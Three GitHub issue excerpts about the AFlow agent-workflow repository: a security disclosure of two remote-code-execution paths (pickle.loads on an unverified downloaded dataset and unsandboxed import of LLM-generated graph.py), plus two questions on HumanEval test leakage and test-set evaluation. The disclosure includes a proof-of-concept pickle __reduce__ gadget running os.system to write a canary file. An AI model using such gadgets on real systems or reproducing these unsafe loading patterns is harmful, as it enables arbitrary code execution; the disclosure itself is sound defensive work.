issues.title: livecodebench loader pickle.loads an unsigned dataset; optimizer __import__'s generated graph.py unsandboxed
issues.body_excerpt:
## What

Two RCE primitives, both at commit `3f457218fc716093fe53f6df8a5d5e6379d66346` on `main` (FoundationAgents/AFlow).

1. `benchmarks/livecodebench.py:142` deserializes each row's `private_test_cases` with `pickle.loads(zlib.decompress(base64.b64decode(...)))` in the `except` branch of the plain-JSON parse at `:139` — the handler for records whose `private_test_cases` is not valid JSON. The full base64->zlib->pickle chain is a real decode path, not a defensive stub. The dataset comes from an unsigned Google-Drive URL (`data/download_data.py:70`) and is `tar.extractall`'d at `:34`; neither `download_data.py` nor `livecodebench.py` calls `hashlib` or verifies a sha256/signature.
2. `scripts/optimizer_utils/graph_utils.py:31` does `__import__(graph_module_name, fromlist=[""])` on the round's `graph.py`, which `write_graph_files` (`:115`) writes from the LLM graph response into `workspace/<dataset>/workflows/round_N/` (matched by the `.gitignore` `/workspace` entry, so newly generated rounds are untracked). Module-top-level code runs in-process, unsandboxed, as the AFlow user.

## How to reproduce

### 1. Pickle on unsigned dataset (exact decode chain from `livecodebench.py:142-146`)

```
python - <<'PY'
import base64, zlib, pickle, secrets, os
nonce = "canary-" + secrets.token_hex(6)
class G:
    def __reduce__(self):
        return (os.system, (f"printf {nonce} > /tmp/lcb_canary_{nonce}",))
blob = base64.b64encode(zlib.compress(pickle.dumps(G())))
pickle.loads(zlib.decompress(base64.b64decode(blob)))   # livecodebench.py:142
print("hit:", os.path.exists(f"/tmp/lcb_canary_{nonce}"))
PY
```

Observed: `hit: True`. The `__reduce__` gadget fired during unpickle, on the identical chain the loader runs for any record whose `private_test_cases` reaches the `:142` branch. Those bytes originate from the Drive tarball that `download_data.py:34` extracts with no checksum.

### 2. `__import__` of generated graph.py (real `GraphUtils.write_graph_files` + `load_graph`)

```
git clone https://github.com/FoundationAgents/AFlow
cd AFlow
git checkout 3f457218fc716093fe53f6df8a5d5e6379d66346
pip install -r requirements.txt     # no setup.py/pyproject.toml exists; run from this repo root
                                     # tree-sitter==0.23.2 is pinned and may fail to build on Python 3.12+; if so, `pip install tree-sitter` unpinned

export NONCE="canary-$(python -c 'import secrets;print(secrets.token_hex(6))')"
PYTHONPATH=. python - <<'PY'
import os, sys
sys.path.insert

issues.title: Question on the Test operator and HumanEval evaluation
issues.body_excerpt:
First of all, thank you for your excellent work!

I have a question regarding the **Test** operator and the evaluation on the **HumanEval** benchmark.

While reading the source code, I noticed that the **Test** operator appears to execute HumanEval's unit tests during inference. From my understanding, this means the supervisor can observe the test results during the generation process, which seems to leak information from the evaluation set. If that's the case, I wonder whether the reported **pass@1** metric is still a valid measure of generalization.

The relevant code I found is here:
https://github.com/FoundationAgents/AFlow/blob/3f457218fc716093fe53f6df8a5d5e6379d66346/scripts/operators.py#L271

Could you clarify the motivation behind this design? Is this behavior intentional, or could it be an implementation bug? I may have misunderstood the implementation, so I'd appreciate any clarification.

Thanks again for making this project available. I really enjoyed reading the code, and I look forward to your response!

issues.title: Problem on Test set
issues.body_excerpt: From the paper, AFlow is trying to generate a optimized workflow from the val set of benchmarks, and then test the generated workflow on the test set. However, it seems you only have the code for optimizing on val set? Even if I uncomment optimizer.optimize("Test") in run.py, it is hardcoded to run the test set by using the round 1 workflow instead of final optimized workflow?
